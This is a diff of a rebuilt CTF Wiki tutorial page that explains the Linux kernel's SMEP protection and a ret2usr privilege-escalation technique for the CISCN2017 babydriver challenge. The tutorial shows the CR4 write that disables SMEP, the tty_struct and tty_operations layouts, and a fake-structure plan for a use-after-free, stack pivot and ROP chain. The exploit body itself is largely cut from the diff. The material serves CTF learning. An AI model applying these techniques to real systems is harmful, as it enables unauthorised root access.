@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4743,25 +4743,25 @@
 <h2 id="smep">SMEP<a class="headerlink" href="#smep" title="Permanent link">&para;</a></h2>
 <p>为了防止 <code>ret2usr</code> 攻击，内核开发者提出了 <code>smep</code> 保护，smep 全称 <code>Supervisor Mode Execution Protection</code>，是内核的一种保护措施，作用是当 CPU 处于 <code>ring0</code> 模式时，执行 <code>用户空间的代码</code> 会触发页错误；这个保护在 arm 中被称为 <code>PXN</code>。</p>
 <p>通过 qemu 启动内核时的选项可以判断是否开启了 smep 保护。
-<div class="codehilite"><pre><span></span>CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> grep smep ./boot.sh
+<div class="codehilite"><pre><span></span><code>CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> grep smep ./boot.sh
 qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="s1">&#39;console=ttyS0 root=/dev/ram oops=panic panic=1&#39;</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp <span class="nv">cores</span><span class="o">=</span><span class="m">1</span>,threads<span class="o">=</span><span class="m">1</span> -cpu kvm64,+smep
-</pre></div></p>
+</code></pre></div></p>
 <p>也可以通过
-<div class="codehilite"><pre><span></span>CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> grep smep /proc/cpuinfo 
+<div class="codehilite"><pre><span></span><code>CISCN2017_babydriver <span class="o">[</span>master●●<span class="o">]</span> grep smep /proc/cpuinfo 
 flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single pti tpr_shadow vnmi flexpriority ept vpid fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid rdseed adx smap intel_pt xsaveopt dtherm ida arat pln pts
 ......
-</pre></div>
+</code></pre></div>
 检测该保护是否开启。</p>
 <h3 id="smep-cr4">smep 和 CR4 寄存器<a class="headerlink" href="#smep-cr4" title="Permanent link">&para;</a></h3>
 <p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p>
 <p><img alt="smep" src="../figure/smep.jpg" /></p>
 <p>例如，当
-<div class="codehilite"><pre><span></span>$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000
-</pre></div>
+<div class="codehilite"><pre><span></span><code>$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000
+</code></pre></div>
 时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要
-<div class="codehilite"><pre><span></span><span class="nf">mov</span> <span class="no">cr4</span><span class="p">,</span> <span class="mi">0x1407e0</span>
+<div class="codehilite"><pre><span></span><code><span class="nf">mov</span> <span class="no">cr4</span><span class="p">,</span> <span class="mi">0x1407e0</span>
 <span class="c"># 0x1407e0 = 101 0 0000 0011 1111 00000</span>
-</pre></div>
+</code></pre></div>
 即可关闭 smep 保护。</p>
 <p>搜索一下从 <code>vmlinux</code> 中提取出的 gadget，很容易就能达到这个目的。</p>
 <ul>
@@ -4774,7 +4774,7 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
 <p>之前已经分析过使用 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf/#ciscn2017-babydriver">uaf 改 cred</a> 的做法，这次换一种方法，通过关闭 smep 保护和 ret2usr 来提权。</p>
 <p>这里选取的方法是先通过 uaf 控制一个 <code>tty_struct</code> 结构，在 <code>open("/dev/ptmx", O_RDWR)</code> 时会分配这样一个结构体</p>
 <p><code>tty_struct</code> 的 <a href="https://code.woboq.org/linux/linux/include/linux/tty.h.html#tty_struct">源码</a> 如下：
-<div class="codehilite"><pre><span></span><span class="k">struct</span> <span class="n">tty_struct</span> <span class="p">{</span>
+<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="n">tty_struct</span> <span class="p">{</span>
     <span class="kt">int</span> <span class="n">magic</span><span class="p">;</span>
     <span class="k">struct</span> <span class="n">kref</span> <span class="n">kref</span><span class="p">;</span>
     <span class="k">struct</span> <span class="n">device</span> <span class="o">*</span><span class="n">dev</span><span class="p">;</span>
@@ -4826,9 +4826,9 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
     <span class="k">struct</span> <span class="n">work_struct</span> <span class="n">SAK_work</span><span class="p">;</span>
     <span class="k">struct</span> <span class="n">tty_port</span> <span class="o">*</span><span class="n">port</span><span class="p">;</span>
 <span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>为什么要控制这个结构体呢？因为其中有另一个很有趣的结构体 <code>tty_operations</code>，<a href="https://code.woboq.org/linux/linux/include/linux/tty_driver.h.html#tty_operations">源码</a> 如下：
-<div class="codehilite"><pre><span></span><span class="k">struct</span> <span class="n">tty_operations</span> <span class="p">{</span>
+<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="n">tty_operations</span> <span class="p">{</span>
     <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="n">lookup</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">,</span>
             <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">idx</span><span class="p">);</span>
     <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">install</span><span class="p">)(</span><span class="k">struct</span> <span class="n">tty_driver</span> <span class="o">*</span><span class="n">driver</span><span class="p">,</span> <span class="k">struct</span> <span class="n">tty_struct</span> <span class="o">*</span><span class="n">tty</span><span class="p">);</span>
@@ -4873,9 +4873,9 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
 <span class="cp">#endif</span>
     <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">proc_show</span><span class="p">)(</span><span class="k">struct</span> <span class="n">seq_file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="p">);</span>
 <span class="p">}</span> <span class="n">__randomize_layout</span><span class="p">;</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>大把的函数指针（ pwn 手的风水宝地），因此设想构造下图所示结构体
-<div class="codehilite"><pre><span></span>fake_tty_struct  fake_tty_operations
+<div class="codehilite"><pre><span></span><code>fake_tty_struct  fake_tty_operations
 +---------+      +----------+
 |magic    |  +--&gt;|evil 1    |
 +---------+  |   +----------+
@@ -4887,14 +4887,14 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
 |......   |      +----------+
 |......   |      |......    |
 +---------+      +----------+
-</pre></div>
+</code></pre></div>
 那么我们就可以通过不同的操作（如 <code>write, ioctl</code> 等）来跳转到不同的 evil 了。</p>
 <p>对这道题目而言，因为开启了 smep 保护，因此如果想 ret2usr 提权，需要修改 cr4 的值，而控制函数指针是不够的，可以控制函数指针进行 stack pivot 等操作到我们排布 rop 链的空间，通过 rop 关闭 smep，进而进行后续操作。</p>
 <blockquote>
 <p>这道题目没给 vmlinux，需要使用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 解压内核镜像。</p>
 </blockquote>
 <p>关闭 smep 保护后，就可以通过 rop 来为所欲为了，最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/uaf_tty_struct.c">exp</a> 如下:
-<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
 <span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
@@ -4975,7 +4975,7 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
 
     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div></p>
+</code></pre></div></p>
                 
                   
                 
@@ -5076,7 +5076,7 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5091,7 +5091,7 @@ flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat 
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
